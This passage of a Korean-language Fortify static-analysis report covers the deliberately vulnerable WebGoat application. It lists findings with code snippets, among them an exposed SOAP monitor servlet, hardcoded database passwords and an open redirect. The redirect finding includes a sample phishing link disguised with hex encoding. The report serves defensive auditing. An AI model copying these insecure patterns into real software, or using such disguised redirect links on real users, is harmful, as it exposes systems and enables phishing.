                        <Issue iid="6EAF343D747C9A95AAD3933BF76BF3BB" ruleID="C15A1F06-3B47-4AA2-AFD1-02E895160582">
                            <Category>Axis 2 Misconfiguration: Debug Information</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>91</LineStart>
<Snippet>      &lt;servlet-name&gt;SOAPMonitorService&lt;/servlet-name&gt;
      &lt;display-name&gt;SOAPMonitorService&lt;/display-name&gt;
      &lt;servlet-class&gt;
          org.apache.axis.monitor.SOAPMonitorService
      &lt;/servlet-class&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="6EAF343D747C9A95AAD3933BF76BF3BD" ruleID="C15A1F06-3B47-4AA2-AFD1-02E895160582">
                            <Category>Axis 2 Misconfiguration: Debug Information</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>216</LineStart>
<Snippet> 
    &lt;servlet-mapping&gt;
      &lt;servlet-name&gt;SOAPMonitorService&lt;/servlet-name&gt;
      &lt;url-pattern&gt;/SOAPMonitor&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="6EAF343D747C9A95AAD3933BF76BF3BA" ruleID="C15A1F06-3B47-4AA2-AFD1-02E895160582">
                            <Category>Axis 2 Misconfiguration: Debug Information</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>90</LineStart>
<Snippet>    &lt;servlet&gt;
      &lt;servlet-name&gt;SOAPMonitorService&lt;/servlet-name&gt;
      &lt;display-name&gt;SOAPMonitorService&lt;/display-name&gt;
      &lt;servlet-class&gt;
          org.apache.axis.monitor.SOAPMonitorService</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>J2EE Bad Practices: Threads</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>ThreadSafetyProblem.java의 createContent() 메서드는 95 줄의 sleep()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>J2EE 표준은 일부 경우에 웹 응용 프로그램의 스레드 관리를 금지하는데 스레드 관리는 항상 오류 발생 가능성이 높습니다. 스레드 관리는 어려운 작업이고 예상치 못한 방식으로 응용 프로그램 컨테이너의 동작을 방해할 가능성이 큽니다. 컨테이너를 방해하지 않는 경우에도, 스레드 관리는 보통 발견하기 어렵고 교착 상태, 경쟁 조건(race condition), 및 기타 동기화 오류 등으로 진단되는 버그를 일으킵니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>웹 응용 프로그램 내에서 직접 스레드를 관리하는 것을 피하십시오. 대신 응용 프로그램 컨테이너에서 제공하는 EJB 타이머 서비스 및 메시지 기반 bean과 같은 표준을 사용하십시오.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. J2EE가 아닌 Java 응용 프로그램을 감사하는 경우 J2EE의 부적절한 사례 범주가 사용자 환경에 적용되지 않을 수 있습니다. 이런 경우 Audit Guide를 사용하여 이러한 문제를 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5C8CC415FD7278B9B8A35B3C53B39381" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>ThreadWatcher.java의 run() 메서드는 108 줄의 sleep()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadWatcher.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/ThreadWatcher.java</FilePath>
<LineStart>108</LineStart>
<Snippet>	try
	{
	    Thread.sleep(myTimeout);
	}
	catch (InterruptedException e)</Snippet>
<TargetFunction>sleep()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="71F0625AE57A741FA803D1184A219949" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>Exec.java의 execOptions() 메서드는 303 줄의 start()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>303</LineStart>
<Snippet>	    {
		watcher = new ThreadWatcher(child, interrupted, timeout);
		new Thread(watcher).start();
	    }
</Snippet>
<TargetFunction>start()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A37D4268D19050C04BA6222FAEEFCCA9" ruleID="7DDCF7B6-5C23-48F5-A44A-B6A0E0643058">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>Exec.java의 execOptions() 메서드는 303 줄의 run()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>303</LineStart>
<Snippet>	    {
		watcher = new ThreadWatcher(child, interrupted, timeout);
		new Thread(watcher).start();
	    }
</Snippet>
<TargetFunction>run()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="71F0625AE57A741FA803D1184A21994A" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>Exec.java의 execOptions() 메서드는 114 줄의 start()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>114</LineStart>
<Snippet>	    {
		watcher = new ThreadWatcher(child, interrupted, timeout);
		new Thread(watcher).start();
	    }
</Snippet>
<TargetFunction>start()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BB4EF0C6DFBF7384D36B5136BC23EEE0" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>ThreadSafetyProblem.java의 createContent() 메서드는 95 줄의 sleep()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>95</LineStart>
<Snippet>	    if (!"".equals(currentUser))
	    {
		Thread.sleep(1500);

		// Get the users info from the DB</Snippet>
<TargetFunction>sleep()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A37D4268D19050C04BA6222FAEEFCCAA" ruleID="7DDCF7B6-5C23-48F5-A44A-B6A0E0643058">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>Exec.java의 execOptions() 메서드는 114 줄의 run()을(를) 호출합니다. 경우에 따라 웹 응용 프로그램의 스레드 관리가 금지되어 오류가 발생할 가능성이 항상 높습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>114</LineStart>
<Snippet>	    {
		watcher = new ThreadWatcher(child, interrupted, timeout);
		new Thread(watcher).start();
	    }
</Snippet>
<TargetFunction>run()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Poor Style: Non-final Public Static Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>일반적으로, public 필드가 임의의 외부 클래스에 의해 변경될 수 있으므로 개체의 멤버 필드에 외부 클래스의 직접 접근을 제공하려고 하지 않습니다. 지향적으로 설계된 좋은 개체는 encapsulation을 사용하여 멤버 필드와 같은 구현 세부 정보가 다른 클래스에 노출되는 것을 막습니다. 또한 시스템에서 이 필드를 변경할 수 없다고 보는 경우, 악성 코드는 시스템 동작을 불리하게 변경할 수도 있습니다.

예제 1: 다음 코드에서 ERROR_CODE 필드가 final이 아니라 public 및 static으로 선언되었습니다.


public class MyClass
{
public static int ERROR_CODE = 100;
//...
}

이 경우, 악성 코드는 이 오류 코드를 변경하고 프로그램을 예기치 않은 방식으로 동작하게 만들 수도 있습니다.&#13;
이 카테고리는 Cigital Java Rulepack에서 비롯되었습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>필드를 상수 값으로 노출시키려면 해당 필드는 public static final로 선언되어야 합니다. 그렇지 않으면 private 필드를 선언하십시오.

예제 2:

public class MyClass
{
public static final int ERROR_CODE = 123;
//...
}</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3D3B0CF2E42BCD0A6398480A11773DE6" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>82</LineStart>
<Snippet>    static boolean beenRestartedYet = false;

    public static Connection connection = null;

    public final static String firstName = "getFirstName";</Snippet>
<TargetFunction>Field: connection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4BC01878981195B737F743B5F5D2B440" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>85</LineStart>
<Snippet>     * Properties file path
     */
    public static String propertiesPath = null;

</Snippet>
<TargetFunction>Field: propertiesPath()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C2BFA7617B92FB6BE0C2ED442FE41955" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>50</LineStart>
<Snippet>{

    public static String servletContextRealPath = null;

</Snippet>
<TargetFunction>Field: servletContextRealPath()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A23E4C61BF5F1E75B85E8B32C06E75CE" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XMLInjection.java</FilePath>
<LineStart>61</LineStart>
<Snippet>    private final static String ACCOUNTID = "accountID";

    public static HashMap rewardsMap = new HashMap();

    private final static IMG MAC_LOGO = new IMG("images/logos/macadamian.gif").setAlt(</Snippet>
<TargetFunction>Field: rewardsMap()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2E81F5EFD08CBCDDBAC3E3611EA9EDCA" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>74</LineStart>
<Snippet>
    //static boolean completed;
    public static Connection connection = null;

    public final static String firstName = "getFirstName";</Snippet>
<TargetFunction>Field: connection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E17ACA7483F9F7AF59E377D763E7983D" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>비 final public static 필드는 외부 클래스에 의해 변경될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Screen.java</FilePath>
<LineStart>54</LineStart>
<Snippet>     *  Description of the Field
     */
    public static int MAIN_SIZE = 375;

    //private Head head;</Snippet>
<TargetFunction>Field: MAIN_SIZE()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>J2EE Bad Practices: getConnection()</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>J2EE 표준은 직접적인 연결 관리를 금지합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>J2EE 표준에 따르면 응용 프로그램이 컨테이너의 리소스 관리 기능을 사용하여 리소스 연결을 확보해야 합니다. 

예를 들어, J2EE 응용 프로그램은 다음과 같이 데이터베이스에 연결해야 합니다.


ctx = new InitialContext();
datasource = (DataSource)ctx.lookup(DB_DATASRC_REF);
conn = datasource.getConnection();


또한 다음과 같은 방식으로 연결하는 것은 피해야 합니다.


conn = DriverManager.getConnection(CONNECT_STRING);


모든 주요 웹 응용 프로그램 컨테이너는 리소스 관리 프레임워크의 일부로 공용 데이터베이스 연결 관리 기능을 제공합니다. 응용 프로그램에 이 기능을 복제하는 것은 어려운 작업이고 오류가 발생하기 쉽기 때문에 J2EE 표준에서 금지합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>DriverManager.getConnection()의 직접 호출을 적절한 연결 팩토리의 JNDI 조회로 대체하여 연결 팩토리를 통해 연결합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 사용 중인 리소스 관리 스키마의 복잡성에 따라 독점 연결 관리 인프라에서 특정 오류를 식별하는 것이 어려울 수 있습니다. 버그를 찾으려 하는 대신 컨테이너에서 제공하는 연결 풀 관리자로 응용 프로그램을 마이그레이션하도록 합니다.

2. 야기될 가능성이 있는 더 많은 일반적인 성능 문제 외에도 독점 연결 관리는 비밀번호 관리 실수로 이어지는 경우가 많습니다. 자체 데이터베이스 연결을 관리하는 응용 프로그램에서는 즉시 사용할 수 있는 대안이 없기 때문에 일반 텍스트 구성 파일에 하드코드되거나 저장된 비밀번호를 찾는 것이 일반적입니다. 이러한 유형의 동작 예는 응용 프로그램 서버 관리 연결 풀로 이동하기 위한 인수에 정보를 추가하는 역할을 해야 합니다.

3. J2EE가 아닌 Java 응용 프로그램을 감사하는 경우 J2EE의 부적절한 사례 범주가 사용자 환경에 적용되지 않을 수 있습니다. 이런 경우 Audit Guide를 사용하여 이러한 문제를 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A09AE144AE395B011A8BCD8E723A9244" ruleID="EDD8E0B5-D8F2-4F56-A20B-549E3880318B">
                            <Category>J2EE Bad Practices: getConnection()</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>J2EE 표준은 직접적인 연결 관리를 금지합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>78</LineStart>
<Snippet>	Class.forName(driverName);

	return (DriverManager.getConnection(connectionString));
    }
</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2CD2759C69A0E24CF5AFD8284BFECEA4" ruleID="EDD8E0B5-D8F2-4F56-A20B-549E3880318B">
                            <Category>J2EE Bad Practices: getConnection()</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>J2EE 표준은 직접적인 연결 관리를 금지합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>105</LineStart>
<Snippet>		dbName = dbName.concat("database.prp");
		Class.forName("org.enhydra.instantdb.jdbc.idbDriver");
		return DriverManager.getConnection("jdbc:idb:" + dbName);
	    }
	}</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C03165CB85975247DBF40E816A1A007A" ruleID="EDD8E0B5-D8F2-4F56-A20B-549E3880318B">
                            <Category>J2EE Bad Practices: getConnection()</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>J2EE 표준은 직접적인 연결 관리를 금지합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>68</LineStart>
<Snippet>	Class.forName(s.getDatabaseDriver());

	return (DriverManager.getConnection(s.getDatabaseConnectionString()));
    }
</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="800E5D45253401B7011A3E425FA7E38C" ruleID="EDD8E0B5-D8F2-4F56-A20B-549E3880318B">
                            <Category>J2EE Bad Practices: getConnection()</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>J2EE 표준은 직접적인 연결 관리를 금지합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>98</LineStart>
<Snippet>		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		return DriverManager
			.getConnection("jdbc:odbc:;DRIVER=Microsoft Access Driver (*.mdb);DBQ="
				+ dbName + ";PWD=webgoat");
	    }</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C80D7C3499FFE0DA5ABD6063A35EED34" ruleID="EDD8E0B5-D8F2-4F56-A20B-549E3880318B">
                            <Category>J2EE Bad Practices: getConnection()</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>J2EE 표준은 직접적인 연결 관리를 금지합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>70</LineStart>
<Snippet>
	    connection = DriverManager
		    .getConnection(
			    "jdbc:odbc:;DRIVER=Microsoft Access Driver (*.mdb);DBQ=c:/webgoat.mdb;PWD=webgoat",
			    "webgoat", "webgoat");</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Open Redirect</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>config.jsp 파일은 12 줄의 HTTP 리디렉션 함수에 확인되지 않은 데이터를 전달합니다. 리디렉션에 사용된 URL을 제어하도록 확인되지 않은 입력을 허용하면 피싱 공격에 도움이 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>리디렉션은 웹 응용 프로그램이 동일한 응용 프로그램 내의 다른 페이지 또는 외부 사이트로 사용자를 안내하도록 허용합니다. 경우에 따라, 응용 프로그램은 리디렉션을 사용하여 사이트 탐색을 지원하고 사용자가 사이트를 종료하는 방법을 추적합니다. 웹 응용 프로그램이 클라이언트를 공격자가 제어할 수 있는 임의의 URL로 리디렉션할 때 open redirection 취약점이 발생합니다. 

공격자는 Open Redirection을 사용하여 사용자가 믿을 수 있는 사이트의 URL을 방문하고 있는 것으로 믿게 하고 악의적인 사이트로 리디렉션할 수 있습니다. 공격자는 URL을 인코딩하여 최종 사용자가 악의적인 리디렉션의 대상을 알기가 더 어렵도록 만들기 때문에 심지어 이 URL이 신뢰할 수 있는 사이트에 대한 URL 매개 변수로 전달됩니다. open redirection은 주로 중요한 최종 사용자의 데이터를 빼가는 피싱 사기의 일부로 남용됩니다.



예제 1: 다음 JSP 코드는 사용자가 링크를 클릭할 때 사용자의 브라우저가 dest 요청 매개 변수에서 구문 분석한 URL을 열도록 지시합니다.


    &lt;%
        ...
        String strDest = request.getParameter("dest");
        pageContext.forward(strDest);
        ...
    %&gt;


피해자가 “http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com” 링크를 따라가도록 유도하는 전자 메일을 수신한 경우, 사용자는 신뢰할 수 있는 사이트로 이동하는 것으로 믿고 링크를 클릭하게 됩니다. 하지만 피해자가 링크를 클릭하면 Example 1의 코드가 브라우저를 “http://www.wilyhacker.com”으로 리디렉션합니다.

많은 사용자들은 해당 링크가 그들이 아는 신뢰할 수 있는 사이트를 지정하는지 확인하기 위해 전자 메일에서 수신한 URL을 항상 검사하도록 교육받고 있습니다. 그러나 공격자가 의도한 피해자의 링크 목적지를 아래와 같이 헥사 인코드된 URL로 위장할 경우
"http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D"

아무리 경험 많은 최종 사용자도 링크를 따라갈 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>확인되지 않은 사용자 입력은 리디렉션에서 대상 URL을 제어하도록 허용해서는 안 됩니다. 대신 다음과 같이 간접적인 방법을 사용합니다. 즉, 사용자가 지정할 수 있는 올바른 URL 목록을 만들어 사용자가 목록에서 선택하는 것만 허용하는 것입니다. 이러한 방법으로 사용자가 제공한 입력 내용은 URL 리디렉션 지정에 직접 사용되지 않습니다.

예제 2: 다음 코드는 올바른 URL이 입력된 배열을 참조합니다. 사용자가 클릭하는 링크는 원하는 URL로 구성된 배열 인덱스로 전달됩니다.


    &lt;%
        ...
        try {
            int strDest = Integer.parseInt(request.getParameter("dest"));
            if((strDest &gt;= 0) &amp;&amp; (strDest &lt;= strURLArray.length -1 ))
            {
                strFinalURL = strURLArray[strDest];
                pageContext.forward(strFinalURL);
            }
        }
        catch (NumberFormatException nfe) {
            // Handle exception
            ...
        }
        ...
    %&gt;


경우에 따라, 이러한 방법은 올바른 URL 집합이 너무 크거나 추적이 어려워 실용적이지 못할 수 있습니다. 이러한 경우 사용자를 리디렉션할 수 있는 도메인을 제한하는 다른 방법을 사용하면, 적어도 사용자를 악의적인 외부 사이트로 보내는 공격을 예방할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.

2. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
